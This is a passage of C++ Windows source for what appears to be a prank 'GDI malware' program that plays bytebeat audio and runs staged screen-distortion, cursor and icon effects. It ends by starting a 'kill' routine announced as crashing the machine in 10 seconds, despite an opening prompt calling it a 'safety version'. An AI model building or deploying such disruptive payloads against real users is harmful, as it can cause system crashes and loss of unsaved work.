	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(tan(9 * (t * ((t >> 9 ^ t >> 6) * 15) | 16))); //tan O_O

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound3() { //NO credits to camellia-y7x, but I modified it
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>((114 % 514 * (t * ((t >> 7) | (t << 9)))));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound4() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>((t & t + t / 25) - t * (t >> 15) & 64);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound5() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[32000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>((t >> 8 | t >> 9 & t >> 13) ^ t);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound6() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>((t >> 4) * (t >> 6) + t >> 3 ^ t >> 4);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound7() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>((t ^ t >> 5) * t >> 9);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound8() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[32000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>((int)(t * cos((t >> 13) | (t >> 8))) ^ (t >> 16)) ^ t;

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound9() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[32000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * cos((t >> (t & 8192 ? 3 : 2) >> 2 | t) & t >> 10));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound10() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(tan(t + floor(pow(t, 9))) + 2);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound11() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 60] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * (0xB598 >> (t >> 3) + 15) * t >> 8);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound12() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(sqrt(t + t >> 5) * cos(t ^ t >> 7));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound13() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[32000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * cos(t >> 4));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound14() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[32000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * cos((t >> 4 - t % 16 * t >> 8) ^ t >> 12));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound15() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(tan(5 * t >> 11 & 5 * t >> 1));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound16() { //Air.exeからリサイクルしただけですが編集しました
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t >> 10 ^ t * 5) - (t >> 8 | t * 4) & (t >> 4 ^ t * 9);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound17() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[32000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>((t >> 1) * (int)cos(t >> 4) | (t >> 3) ^ (t >> 4));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound18() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[32000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>((t * (int)log(t & (t << 4 ^ (t >> 17 - 3)) + 3) >> 8) - t);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound19() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[32000 * 10] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * random()); //too lazy to change

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
DWORD WINAPI beforeKill2(LPVOID lpParam) {
	MessageBox(NULL, L"You have 10 seconds until the machine crashes", L"xzhgowbweivqm", MB_ICONINFORMATION);
	return 0;
}
DWORD WINAPI kill(LPVOID lpParam) {
	CreateThread(0, 0, beforeKill, 0, 0, 0);
	CreateThread(0, 0, beforeKill2, 0, 0, 0);
	return 0;
}
int CALLBACK WinMain(
	HINSTANCE hInstance, HINSTANCE hPrevInstance,
	LPSTR     lpCmdLine, int       nCmdShow
)
{
	if (MessageBoxW(NULL, L"Safety version. this will not do anything to your system", L"xzhgowbweivqm.exe", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
	{
		ExitProcess(0);
	}
	else
	{
		HANDLE messageBox = CreateThread(0, 0, msg, 0, 0, 0);
		Sleep(5000);
		HANDLE thread1 = CreateThread(0, 0, shader1, 0, 0, 0);
		HANDLE thread1dot1 = CreateThread(0, 0, blockz, 0, 0, 0); //incredible naming
		sound1();
		Sleep(30000);
		TerminateThread(thread1, 0);
		CloseHandle(thread1);
		InvalidateRect(0, 0, 0);
		HANDLE thread2 = CreateThread(0, 0, shader2, 0, 0, 0);
		HANDLE thread2dot1 = CreateThread(0, 0, shader2dot1, 0, 0, 0);
		HANDLE thread2dot2 = CreateThread(0, 0, circle, 0, 0, 0);
		sound2();
		Sleep(30000);
		TerminateThread(thread2, 0);
		CloseHandle(thread2);
		TerminateThread(thread2dot1, 0);
		CloseHandle(thread2dot1);
		InvalidateRect(0, 0, 0);
		HANDLE thread3 = CreateThread(0, 0, shader3, 0, 0, 0);
		HANDLE thread3dot1 = CreateThread(0, 0, blur1, 0, 0, 0);
		HANDLE thread3dot2 = CreateThread(0, 0, customiconradius, 0, 0, 0);
		sound3();
		Sleep(30000);
		TerminateThread(thread3, 0);
		CloseHandle(thread3);
		TerminateThread(thread3dot1, 0);
		CloseHandle(thread3dot1);
		TerminateThread(thread2dot2, 0);
		CloseHandle(thread2dot2);
		InvalidateRect(0, 0, 0);
		HANDLE thread4 = CreateThread(0, 0, shader4, 0, 0, 0);
		HANDLE thread4dot1 = CreateThread(0, 0, blur2, 0, 0, 0);
		sound4();
		Sleep(30000);
		TerminateThread(thread4, 0);
		CloseHandle(thread4);
		InvalidateRect(0, 0, 0);
		HANDLE thread5 = CreateThread(0, 0, shader5, 0, 0, 0);
		HANDLE thread5dot1 = CreateThread(0, 0, textoutz, 0, 0, 0);
		sound5();
		Sleep(30000);
		TerminateThread(thread5, 0);
		CloseHandle(thread5);
		InvalidateRect(0, 0, 0);
		HANDLE thread6 = CreateThread(0, 0, shader6, 0, 0, 0);
		sound6();
		Sleep(30000);
		TerminateThread(thread6, 0);
		CloseHandle(thread6);
		InvalidateRect(0, 0, 0);
		HANDLE thread7 = CreateThread(0, 0, shader7, 0, 0, 0);
		sound7();
		Sleep(30000);
		TerminateThread(thread7, 0);
		CloseHandle(thread7);
		TerminateThread(thread3dot2, 0);
		CloseHandle(thread3dot2);
		InvalidateRect(0, 0, 0);
		HANDLE thread8 = CreateThread(0, 0, shader8, 0, 0, 0);
		HANDLE thread8dot1 = CreateThread(0, 0, poly, 0, 0, 0);
		sound8();
		Sleep(30000);
		TerminateThread(thread8, 0);
		CloseHandle(thread8);
		InvalidateRect(0, 0, 0);
		HANDLE thread9 = CreateThread(0, 0, shader9, 0, 0, 0);
		sound9();
		Sleep(30000);
		TerminateThread(thread9, 0);
		CloseHandle(thread9);
		InvalidateRect(0, 0, 0);
		HANDLE thread10 = CreateThread(0, 0, shader10, 0, 0, 0);
		sound10();
		Sleep(30000);
		TerminateThread(thread10, 0);
		CloseHandle(thread10);
		TerminateThread(thread5dot1, 0);
		CloseHandle(thread5dot1);
		TerminateThread(thread4dot1, 0);
		CloseHandle(thread4dot1);
		TerminateThread(thread8dot1, 0);
		CloseHandle(thread8dot1);
		TerminateThread(thread1dot1, 0);
		CloseHandle(thread1dot1);
		InvalidateRect(0, 0, 0);
		HANDLE thread11 = CreateThread(0, 0, shader11, 0, 0, 0);
		sound11();
		Sleep(30000);
		TerminateThread(thread11, 0);
		CloseHandle(thread11);
		InvalidateRect(0, 0, 0);
		HANDLE thread12 = CreateThread(0, 0, shader12, 0, 0, 0);
		Sleep(30000);
		TerminateThread(thread12, 0);
		CloseHandle(thread12);
		InvalidateRect(0, 0, 0);
		HANDLE thread13 = CreateThread(0, 0, shader13, 0, 0, 0);
		sound12(); //unsyncing audio now wahoo
		Sleep(30000);
		TerminateThread(thread13, 0);
		CloseHandle(thread13);
		InvalidateRect(0, 0, 0);
		HANDLE thread14 = CreateThread(0, 0, shader14, 0, 0, 0);
		HANDLE thread14dot1 = CreateThread(0, 0, payload14, 0, 0, 0);
		sound13();
		Sleep(30000);
		TerminateThread(thread14, 0);
		CloseHandle(thread14);
		TerminateThread(thread14dot1, 0);
		CloseHandle(thread14dot1);
		InvalidateRect(0, 0, 0);
		HANDLE thread15 = CreateThread(0, 0, shader15, 0, 0, 0);
		sound14();
		Sleep(30000);
		TerminateThread(thread15, 0);
		CloseHandle(thread15);
		InvalidateRect(0, 0, 0);
		HANDLE thread16 = CreateThread(0, 0, shader16, 0, 0, 0);
		sound15();
		Sleep(30000);
		TerminateThread(thread16, 0);
		CloseHandle(thread16);
		InvalidateRect(0, 0, 0);
		HANDLE thread17 = CreateThread(0, 0, shader17, 0, 0, 0);
		HANDLE thread17dot1 = CreateThread(0, 0, icon2, 0, 0, 0);
		sound16();
		Sleep(30000);
		TerminateThread(thread17, 0);
		CloseHandle(thread17);
		TerminateThread(thread17dot1, 0);
		CloseHandle(thread17dot1);
		InvalidateRect(0, 0, 0);
		HANDLE thread18 = CreateThread(0, 0, dark, 0, 0, 0);
		HANDLE thread18dot1 = CreateThread(0, 0, mess, 0, 0, 0);
		HANDLE thread18dot2 = CreateThread(0, 0, curmove, 0, 0, 0);
		sound17();
		Sleep(30000);
		TerminateThread(thread18, 0);
		CloseHandle(thread18);
		TerminateThread(thread18dot1, 0);
		CloseHandle(thread18dot1);
		InvalidateRect(0, 0, 0);
		HANDLE thread19 = CreateThread(0, 0, shader19, 0, 0, 0);
		sound18();
		Sleep(30000);
		TerminateThread(thread19, 0);
		CloseHandle(thread19);
		TerminateThread(thread18dot2, 0);
		CloseHandle(thread18dot2);
		InvalidateRect(0, 0, 0);
		HANDLE thread20 = CreateThread(0, 0, shaderfinale, 0, 0, 0);
		sound19();
		Sleep(10000);
		TerminateThread(thread20, 0);
		CloseHandle(thread20);
		TerminateThread(messageBox, 0);
		CloseHandle(messageBox);
		InvalidateRect(0, 0, 0);
		CreateThread(0, 0, kill, 0, 0, 0);
		Sleep(10000);
	}
}